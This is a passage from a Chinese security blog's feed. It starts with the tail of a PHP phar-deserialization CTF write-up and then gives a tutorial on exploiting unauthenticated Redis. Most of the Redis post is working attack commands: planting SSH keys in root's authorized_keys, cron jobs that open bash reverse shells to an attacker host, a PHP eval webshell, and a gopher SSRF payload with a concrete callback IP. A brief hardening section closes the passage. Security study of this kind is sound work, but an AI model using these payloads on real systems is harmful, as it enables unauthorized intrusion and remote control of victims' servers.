class="number">6</span>) !== <span class="string">"GIF89a"</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Fuck off"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">file_put_contents($path . <span class="string">"/avatar.gif"</span>, $data);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Upload OK"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 这两个函数都将造成反序列化</span></span><br><span class="line"><span class="keyword">if</span> (!file_exists($path . <span class="string">"/avatar.gif"</span>)) &#123;</span><br><span class="line">$path = <span class="string">"/var/www/html"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">"Content-Type: image/gif"</span>);</span><br><span class="line"><span class="keyword">die</span>(file_get_contents($path . <span class="string">"/avatar.gif"</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mode = $_GET[<span class="string">"m"</span>];</span><br><span class="line"><span class="keyword">if</span> ($mode == <span class="string">"upload"</span>) &#123;</span><br><span class="line">upload(check_session());</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ($mode == <span class="string">"show"</span>) &#123;</span><br><span class="line">show(check_session());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外还有：</p><ul><li><p>护网杯 easy laravel</p></li><li><p>code-breaking lumenserial</p></li></ul><h2 id="相关绕过"><a href="#相关绕过" class="headerlink" title="相关绕过"></a>相关绕过</h2><p>TODO</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/resource=phar://phar.phar</span></span><br></pre></td></tr></table></figure><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>来看一下源码  <a href="https://github.com/php/php-src/blob/29b56a878aa22310d645c3266110417e07ebe683/ext/phar/phar.c#L618" target="_blank" rel="noopener">php-src/ext/phar/phar.c:618</a>，调用了 <code>php_var_unserialize</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!php_var_unserialize(metadata, &amp;p, p + zip_metadata_len, &amp;var_hash)) &#123;</span><br></pre></td></tr></table></figure><p>太忙了，有时间深入分析一下。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/38</a></p><p><a href="https://blog.szfszf.top/tech/phar%E5%8D%8F%E8%AE%AE%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://blog.szfszf.top/tech/phar%E5%8D%8F%E8%AE%AE%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p><a href="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/" target="_blank" rel="noopener">http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;h3 id=&quot;与普通反序列化利用有什么区别？&quot;&gt;&lt;a href=&quot;#与普通反序列化利用有什么区别？&quot; class=&quot;headerlink&quot; ti
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Redis 未授权访问相关利用</title>
    <link href="https://wywwzjj.top/2019/05/17/Redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8/"/>
    <id>https://wywwzjj.top/2019/05/17/Redis-未授权访问相关利用/</id>
    <published>2019-05-17T13:49:23.000Z</published>
    <updated>2019-08-11T09:50:18.845Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Redis-介绍"><a href="#Redis-介绍" class="headerlink" title="Redis 介绍"></a>Redis 介绍</h2><h3 id="是什么？"><a href="#是什么？" class="headerlink" title="是什么？"></a>是什么？</h3><p>Redis 是一个开源（BSD许可）的，内存中的数据结构存储系统，它可以用作数据库、缓存和消息中间件。 它支持多种类型的数据结构，如 <a href="http://www.redis.cn/topics/data-types-intro.html#strings" target="_blank" rel="noopener">字符串（strings）</a>， <a href="http://www.redis.cn/topics/data-types-intro.html#hashes" target="_blank" rel="noopener">散列（hashes）</a>， <a href="http://www.redis.cn/topics/data-types-intro.html#lists" target="_blank" rel="noopener">列表（lists）</a>， <a href="http://www.redis.cn/topics/data-types-intro.html#sets" target="_blank" rel="noopener">集合（sets）</a>， <a href="http://www.redis.cn/topics/data-types-intro.html#sorted-sets" target="_blank" rel="noopener">有序集合（sorted sets）</a> 与范围查询， <a href="http://www.redis.cn/topics/data-types-intro.html#bitmaps" target="_blank" rel="noopener">bitmaps</a>， <a href="http://www.redis.cn/topics/data-types-intro.html#hyperloglogs" target="_blank" rel="noopener">hyperloglogs</a> 和 <a href="http://www.redis.cn/commands/geoadd.html" target="_blank" rel="noopener">地理空间（geospatial）</a> 索引半径查询。 Redis 内置了 <a href="http://www.redis.cn/topics/replication.html" target="_blank" rel="noopener">复制（replication）</a>，<a href="http://www.redis.cn/commands/eval.html" target="_blank" rel="noopener">LUA脚本（Lua scripting）</a>， <a href="http://www.redis.cn/topics/lru-cache.html" target="_blank" rel="noopener">LRU驱动事件（LRU eviction）</a>，<a href="http://www.redis.cn/topics/transactions.html" target="_blank" rel="noopener">事务（transactions）</a> 和不同级别的 <a href="http://www.redis.cn/topics/persistence.html" target="_blank" rel="noopener">磁盘持久化（persistence）</a>， 并通过 <a href="http://www.redis.cn/topics/sentinel.html" target="_blank" rel="noopener">Redis哨兵（Sentinel）</a>和自动 <a href="http://www.redis.cn/topics/cluster-tutorial.html" target="_blank" rel="noopener">分区（Cluster）</a>提供高可用性（high availability）。</p><p><img src="https://ws1.sinaimg.cn/large/de75fd55gy1g35u4fne4fj20ju0jeae1.jpg" alt></p><p>Redis 主要将数据存在内存中，缓存作用实际高于存储作用，随时可执行 <code>save</code> 命令将当前内存里的数据存入硬盘中。如果需要恢复数据，只需将备份文件 <code>dump.rdb</code> 移动到 redis 安装目录并启动服务即可。通常看，将数据放在内存中是不安全的，一旦发生断电或者机器故障， 重要的数据可能就会丢失，因此 Redis 提供了两种持久化方式：RDB 和 AOF，即可以用两种策略将内存的数据保存到硬盘中，这样就保证了数据的可持久性。</p><p>还有个重要特点，其所有操作都是原子性的，要么成功执行，要么完全不执行。</p><h3 id="能做什么？"><a href="#能做什么？" class="headerlink" title="能做什么？"></a>能做什么？</h3><ul><li><strong>缓存</strong><br>  缓存机制几乎在所有的大型网站都有使用，合理地使用缓存不仅可以加 快数据的访问速度，而且能够有效地降低后端数据源的压力。Redis 提供了键值过期时间设置，并且也提供了灵活控制最大内存和内存溢出后的淘汰策略。可以这么说，一个合理的缓存设计能够为一个网站的稳定保驾护航。</li><li><strong>排行榜系统</strong><br>  排行榜系统几乎存在于所有的网站，例如按照热度排名的排行榜，按照发布时间的排行榜，按照各种复杂维度计算出的排行榜，Redis 提供了列表和有序集合数据结构，合理地使用这些数据结构可以很方便地构建各种排行榜系统。</li><li><strong>计数器应用</strong><br>  计数器在网站中的作用至关重要，例如视频网站有播放数、电商网站有 浏览数，为了保证数据的实时性，每一次播放和浏览都要做加 1 的操作，如果并发量很大对于传统关系型数据的性能是一种挑战。Redis 天然支持计数功能而且计数的性能也非常好，可以说是计数器系统的重要选择。</li><li><strong>社交网络</strong><br>  赞/踩、粉丝、共同好友/喜好、推送、下拉刷新等是社交网站的必备功能，由于社交网站访问量通常比较大，而且传统的关系型数据不太适合保存这种类型的数据，Redis提供的数据结构可以相对比较容易地实现这些功<br>  能。</li><li><strong>消息队列系统</strong><br>  消息队列系统可以说是一个大型网站的必备基础组件，因为其具有业务 解耦、非实时业务削峰等特性。Redis提供了发布订阅功能和阻塞队列的功能，虽然和专业的消息队列比还不够足够强大，但是对于一般的消息队列功能基本可以满足。</li></ul><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>你可以在这做做实验 <a href="http://try.redis.io/" target="_blank" rel="noopener">http://try.redis.io/</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 启动 redis</span></span><br><span class="line"><span class="meta">$</span><span class="bash">redis-server</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 打开客户端（交互模式）</span></span><br><span class="line"><span class="meta">$</span><span class="bash">redis-cli</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">ping  <span class="comment"># 测试是否启动</span></span></span><br><span class="line">=&gt; pong # 则成功</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 远程连接</span></span><br><span class="line"><span class="meta">$</span><span class="bash">redis-cli -h host -p port -a password</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 执行命令</span></span><br><span class="line"><span class="meta">$</span><span class="bash">redis-cli -h 127.0.0.1-p 6379 get hello</span></span><br><span class="line">"world"</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">redis-cli -r 3 ping  <span class="comment"># -r 将命令重复执行多次，[-i 3 则是每三秒执行一次命令]</span></span></span><br><span class="line">PONG</span><br><span class="line">PONG</span><br><span class="line">PONG</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">echo</span> <span class="string">"world"</span> |redis-cli -x <span class="built_in">set</span> hello  <span class="comment"># -x 从标准输入作为该命令的最后一个参数</span></span></span><br><span class="line">Ok</span><br><span class="line"></span><br><span class="line">info# 提供服务器的信息和统计</span><br><span class="line">flushall # 删除所有数据库内容</span><br><span class="line">flushdb# 刷新数据库</span><br><span class="line">set test "test" # 设置变量</span><br><span class="line">config set dir dirpath # 设置路径等配置</span><br><span class="line">config get xxx# 获取动态配置信息</span><br><span class="line">save # 将内存中的数据保存到硬盘中</span><br><span class="line">get var</span><br><span class="line">select 2# 选择 2 号数据库，默认有 16 个数据库</span><br><span class="line">del key  # 删除返回 1</span><br><span class="line">exists key # 检查 key 是否存在</span><br><span class="line">expire key seconds # 给 key 设置过期时间（秒）</span><br><span class="line">expireat key timestamp# 设置过期时间（时间戳）</span><br><span class="line">keys pattern# 查找符合模式的 key，用 ? * 模糊匹配</span><br><span class="line">move key db# 将当前数据库 key 移动到数据库 db 中</span><br><span class="line">persist key# 移除过期时间，key 持续有效</span><br><span class="line">pttl key# 返回 key 剩余生存时间（毫秒）</span><br><span class="line">ttl key # 返回 key 剩余生存时间（秒）</span><br><span class="line">randomkey# 随机返回一个 key</span><br><span class="line">rename key newkey# 重命名</span><br><span class="line">renamex key newkey# 仅当 newkey 不存在时重命名</span><br><span class="line">type key# 获取类型</span><br><span class="line">dump key# 序列化</span><br></pre></td></tr></table></figure><h2 id="非授权访问"><a href="#非授权访问" class="headerlink" title="非授权访问"></a>非授权访问</h2><p><strong>为什么会出现非授权访问？</strong></p><p>设计哲学？以 root 权限运行？</p><blockquote><p> 以下利用都是基于 redis 的持久化进行的任意文件写入，其他玩法可以自己开开脑洞。</p></blockquote><h3 id="写公钥直接-ssh-连接"><a href="#写公钥直接-ssh-连接" class="headerlink" title="写公钥直接 ssh 连接"></a>写公钥直接 ssh 连接</h3><p>本地生成公私钥文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ssh-keygen –t rsa</span></span><br></pre></td></tr></table></figure><p>将公钥写入 key.txt 文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> (<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n"</span>) &gt; key.txt</span></span><br></pre></td></tr></table></figure><p>连接 Redis 写入文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat key.txt | redis-cli -h 127.0.0.1 -x <span class="built_in">set</span> key</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> redis-cli -h 127.0.0.1</span></span><br><span class="line">127.0.0.1:6379&gt; config set dir /root/.ssh/</span><br><span class="line">127.0.0.1:6379&gt; config get dir</span><br><span class="line">1) "dir"</span><br><span class="line">2) "/root/.ssh"</span><br><span class="line">127.0.0.1:6379&gt; config set dbfilename "authorized_keys"</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>直接私钥连接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ssh –i  id_rsa root@ip</span></span><br></pre></td></tr></table></figure><h3 id="利用-crontable-反弹-shell"><a href="#利用-crontable-反弹-shell" class="headerlink" title="利用 crontable 反弹 shell"></a>利用 crontable 反弹 shell</h3><p>nc 监听</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvvp <span class="number">9669</span></span><br></pre></td></tr></table></figure><p>写入定时命令，这里用的 <code>bash</code> ，其他弹法改下语句就行。本地 Ubuntu 弹失败了，再试试 py 看看。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set x "n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/vps_ip/port 0&gt;&amp;1\n\n"</span><br><span class="line">set x "\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/vps_ip/port 0&gt;&amp;1\n\n\n"</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>不同系统（发行版）的定时任务文件所在路径可能不同，以实际系统为准。</p><h3 id="写-webshell"><a href="#写-webshell" class="headerlink" title="写 webshell"></a>写 webshell</h3><p>当服务器开着 web 服务，而且 redis 有 web 目录写权限时，可以尝试写 webshell。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> x <span class="string">"\n\n&lt;?php eval(<span class="variable">$_POST</span>[1]);?&gt;\n"</span></span><br><span class="line">config <span class="builtin-name">set</span> dir /var/www/html</span><br><span class="line">config <span class="builtin-name">set</span> dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h3 id="执行命令（这里还可以继续研究）"><a href="#执行命令（这里还可以继续研究）" class="headerlink" title="执行命令（这里还可以继续研究）"></a>执行命令（这里还可以继续研究）</h3><p>本地建一个 <code>lua</code> 脚本 hello.lua</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> msg = <span class="string">"hello,hack!"</span></span><br><span class="line"><span class="keyword">return</span> msg</span><br></pre></td></tr></table></figure><p>redis 连接并执行</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli eval <span class="string">"$(cat hello.lua)"</span> <span class="number">0</span> -h <span class="number">192.168</span><span class="number">.152</span><span class="number">.128</span></span><br></pre></td></tr></table></figure><h3 id="恢复初始设置"><a href="#恢复初始设置" class="headerlink" title="恢复初始设置"></a>恢复初始设置</h3><p>以下是默认配置，更妥当的做法是使用 <code>config get dir</code> 记录下之前的配置。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 恢复dir</span></span><br><span class="line">config set dir /var/lib/redis</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 恢复dbfilename</span></span><br><span class="line">config set dbfilename dump.rdb</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 刷新数据库</span></span><br><span class="line">flushdb</span><br></pre></td></tr></table></figure><h2 id="结合-ssrf"><a href="#结合-ssrf" class="headerlink" title="结合 ssrf"></a>结合 ssrf</h2><h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h3><p><strong>为什么要用 gopher？</strong></p><blockquote><p>Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。但是经过部分测试，发现阿里云的 libcurl 还是支持 Gopher 协议的，在实际环境中可能会有更多。Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。</p></blockquote><p>协议基本格式：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://<span class="tag">&lt;<span class="name">host</span>&gt;</span>:<span class="tag">&lt;<span class="name">port</span>&gt;</span>/_ + 数据</span><br></pre></td></tr></table></figure><p>TODO：单独写一篇总结</p><h3 id="具体玩法"><a href="#具体玩法" class="headerlink" title="具体玩法"></a>具体玩法</h3><p>写一个反弹脚本，方便抓流量。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> flushall  <span class="comment"># 无法成功时再试试这句，将清掉所有数据</span></span></span><br><span class="line">echo -e "\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/vps_ip/port 0&gt;&amp;1\n\n\n"|redis-cli -h $1 -p $2 -x set 1</span><br><span class="line">redis-cli -h $1 -p $2 config set dir /var/spool/cron/</span><br><span class="line">redis-cli -h $1 -p $2 config set dbfilename root</span><br><span class="line">redis-cli -h $1 -p $2 save</span><br><span class="line">redis-cli -h $1 -p $2 quit</span><br></pre></td></tr></table></figure><p>输出四个 “ok” 即为写入成功。</p><p>先抓一下客户端 <code>redis-cli</code> 执行这些命令所发的数据包，然后尝试伪造。</p><p>开一个端口转发，作为拦截</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -v tcp-listen:2333,fork tcp-connect:localhost:6379</span><br></pre></td></tr></table></figure><blockquote><p>将 2333 端口的数据转发到 6379</p></blockquote><p>将数据流转换为 <code>gopher</code> 形式</p><p>转换规则如下：</p><ul><li>如果第一个字符是 &gt; 或者 &lt; 那么丢弃该行字符串，表示请求和返回的时间。</li><li>如果前 3 个字符是 + OK 那么丢弃该行字符串，表示返回的字符串。</li><li>将 \r 字符串替换成 %0d%0a</li><li>空白行替换为 %0a</li></ul><p>直接上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="comment">#author: JoyChou</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">exp = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">'&gt;&lt;+'</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 判断倒数第2、3字符串是否为\r</span></span><br><span class="line">        <span class="keyword">elif</span> line[<span class="number">-3</span>:<span class="number">-1</span>] == <span class="string">r'\r'</span>:</span><br><span class="line">            <span class="comment"># 如果该行只有\r，将\r替换成%0a%0d%0a</span></span><br><span class="line">            <span class="keyword">if</span> len(line) == <span class="number">3</span>:</span><br><span class="line">                exp += <span class="string">'%0a%0d%0a'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                line = line.replace(<span class="string">r'\r'</span>, <span class="string">'%0d%0a'</span>)</span><br><span class="line">                <span class="comment"># 去掉最后的换行符</span></span><br><span class="line">                line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">                exp += line</span><br><span class="line">        <span class="comment"># 判断是否是空行，空行替换为%0a</span></span><br><span class="line">        <span class="keyword">elif</span> line == <span class="string">'\x0a'</span>:</span><br><span class="line">            exp += <span class="string">'%0a'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">            exp += line</span><br><span class="line">print(<span class="string">'_'</span> + exp)  <span class="comment"># 直接加入 _</span></span><br></pre></td></tr></table></figure><p>将之前 <code>socat</code> 命令输出的数据流存为 <code>data.txt</code>，然后进行转换</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  tmp py3 gopher.py data.txt</span><br><span class="line">_*<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a1%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">66</span>%<span class="number">0</span>d%<span class="number">0</span>a-e %<span class="number">0</span>a%<span class="number">0</span>a*/<span class="number">1</span> * * * * bash -i &gt;&amp; /dev/tcp/<span class="number">47.11</span><span class="number">.220</span><span class="number">.241</span>/<span class="number">9669</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">6</span>%<span class="number">0</span>d%<span class="number">0</span>aconfig%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>adir%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">16</span>%<span class="number">0</span>d%<span class="number">0</span>a/var/spool/cron/%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">6</span>%<span class="number">0</span>d%<span class="number">0</span>aconfig%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">10</span>%<span class="number">0</span>d%<span class="number">0</span>adbfilename%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>aroot%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>asave%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>aquit%<span class="number">0</span>d%<span class="number">0</span>a</span><br></pre></td></tr></table></figure><p>使用 curl 发送 payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v 'gopher://victim_ip:port/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$66%0d%0a-e %0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/47.11.220.241/9669 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a'</span><br></pre></td></tr></table></figure><p>需要注意的是，如果要换 IP 和端口，前面的<code>$58</code>也需要更改，<code>$58</code>表示字符串长度为 58 个字节，上面的 EXP 即是<code>%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0a</code>，3+51+4=58。如果想换成 42.256.24.73，那么 $58 需要改成​ $61，以此类推。</p><h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><h3 id="禁止一些高危命令（重启redis才能生效）"><a href="#禁止一些高危命令（重启redis才能生效）" class="headerlink" title="禁止一些高危命令（重启redis才能生效）"></a>禁止一些高危命令（重启redis才能生效）</h3><ul><li>修改 redis.conf 文件，禁用远程修改 DB 文件地址</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename-command FLUSHALL <span class="string">""</span></span><br><span class="line">rename-command<span class="built_in"> CONFIG </span><span class="string">""</span></span><br><span class="line">rename-command EVAL <span class="string">""</span></span><br></pre></td></tr></table></figure><ul><li>或者通过修改redis.conf文件，改变这些高危命令的名称</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename-command FLUSHALL <span class="string">"name1"</span></span><br><span class="line">rename-command<span class="built_in"> CONFIG </span><span class="string">"name2"</span></span><br><span class="line">rename-command EVAL <span class="string">"name3"</span></span><br></pre></td></tr></table></figure><h3 id="以低权限运行-Redis-服务（重启redis才能生效）"><a href="#以低权限运行-Redis-服务（重启redis才能生效）" class="headerlink" title="以低权限运行 Redis 服务（重启redis才能生效）"></a>以低权限运行 Redis 服务（重启redis才能生效）</h3><p>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd -r redis <span class="meta">&amp;&amp; useradd -r -g redis redis</span></span><br></pre></td></tr></table></figure><h3 id="为-Redis-添加密码验证（重启redis才能生效）"><a href="#为-Redis-添加密码验证（重启redis才能生效）" class="headerlink" title="为 Redis 添加密码验证（重启redis才能生效）"></a>为 Redis 添加密码验证（重启redis才能生效）</h3><p>修改 redis.conf 文件，添加</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">requirepass mypassword</span></span><br></pre></td></tr></table></figure><p>（注意redis不要用-a参数，明文输入密码，连接后使用auth认证）</p><h3 